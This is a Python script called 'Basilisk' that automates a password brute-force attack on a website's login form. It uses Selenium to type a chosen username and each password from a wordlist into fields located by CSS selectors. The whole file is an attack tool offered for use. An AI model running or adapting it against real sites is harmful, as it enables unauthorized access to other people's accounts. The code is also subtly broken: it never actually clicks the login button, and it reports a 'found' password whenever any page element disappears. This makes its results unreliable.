import os
import sys
import datetime
import selenium
import requests
import time as t
from sys import stdout
from selenium import webdriver
from optparse import OptionParser
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

#Configuration
parser = OptionParser()
now = datetime.datetime.now()

#Arguments
parser.add_option("-u", "--username", dest="username",help="Choose the username")
parser.add_option("--usernamesel", dest="usernamesel",help="Choose the username selector")
parser.add_option("--passsel", dest="passsel",help="Choose the password selector")
parser.add_option("--loginsel", dest="loginsel",help= "Choose the login button selector")
parser.add_option("--passlist", dest="passlist",help="Enter the password list directory")
parser.add_option("--website", dest="website",help="choose a website")
(options, args) = parser.parse_args()

os.system('cls')

def perog():
    print (banner)
    website = input('Enter login url: ')
    sys.stdout.write('Checking if site exists '),
    sys.stdout.flush()
    t.sleep(1)
    try:
        request = requests.get(website)
        if request.status_code == 200:
            print ('[OK]')
            sys.stdout.flush()
    except selenium.common.exceptions.NoSuchElementException:
        pass
    except KeyboardInterrupt:
        print ('User used Ctrl-c to exit')
        exit()
    except:
        t.sleep(1)
        print ('Website could not be located make sure to use http or https')
        exit()

    username_selector = input('Enter the username selector: ')
    password_selector = input('Enter the password selector: ')
    login_btn_selector = input('Enter the Login button selector: ')
    username = input('Enter username to brute-force: ')
    pass_list = input('Enter a directory to a password list: ')
    brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website)

def brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website):
    f = open(pass_list, 'r')
    optionss = webdriver.ChromeOptions()
    optionss.add_argument("--disable-popup-blocking")
    optionss.add_argument("--disable-extensions")
    browser = webdriver.Chrome(chrome_options=optionss)
    wait = WebDriverWait(browser, 10)
    while True:
        try:
            for line in f:
                browser.get(website)
                wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, login_btn_selector)))
                Sel_user = browser.find_element_by_css_selector(username_selector) #Finds Selector
                Sel_pas = browser.find_element_by_css_selector(password_selector) #Finds Selector
                enter = browser.find_element_by_css_selector(login_btn_selector) #Finds Selector
                Sel_user.send_keys(username)
                Sel_pas.send_keys(line)
                print('_________________________________________________')
                print ('Tried password: '+ line + 'For user: '+username)
        except KeyboardInterrupt:
            print('CTRL C')
            break
        except selenium.common.exceptions.NoSuchElementException:
            print ('AN ELEMENT HAS BEEN REMOVED FROM THE PAGE SOURCE THIS COULD MEAN 2 THINGS THE PASSWORD WAS FOUND OR YOU HAVE BEEN LOCKED OUT OF ATTEMPTS! ')
            print ('LAST PASS ATTEMPT BELLOW')
            print ('Password has been found: {0}'.format(line))
            print ('Thank you for using Basilisk')
            exit()

banner = '''
▀█████████▄     ▄████████    ▄████████  ▄█   ▄█        ▄█     ▄████████    ▄█   ▄█▄ 
  ███    ███   ███    ███   ███    ███ ███  ███       ███    ███    ███   ███ ▄███▀ 
  ███    ███   ███    ███   ███    █▀  ███▌ ███       ███▌   ███    █▀    ███▐██▀   
 ▄███▄▄▄██▀    ███    ███   ███        ███▌ ███       ███▌   ███         ▄█████▀    
▀▀███▀▀▀██▄  ▀███████████ ▀███████████ ███▌ ███       ███▌ ▀███████████ ▀▀█████▄    
  ███    ██▄   ███    ███          ███ ███  ███       ███           ███   ███▐██▄   
  ███    ███   ███    ███    ▄█    ███ ███  ███▌    ▄ ███     ▄█    ███   ███ ▀███▄ 
▄█████████▀    ███    █▀   ▄████████▀  █▀   █████▄▄██ █▀    ▄████████▀    ███   ▀█▀ 
                                            ▀                             ▀         
'''.format()

if options.username == None:
    if options.usernamesel == None:
        if options.passsel == None:
            if options.loginsel == None:
                if options.passlist == None:
                    if options.website == None:
                        perog()


username = options.username
username_selector = options.usernamesel
password_selector = options.passsel
login_btn_selector = options.loginsel
website = options.website
pass_list = options.passlist
print (banner)
brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website)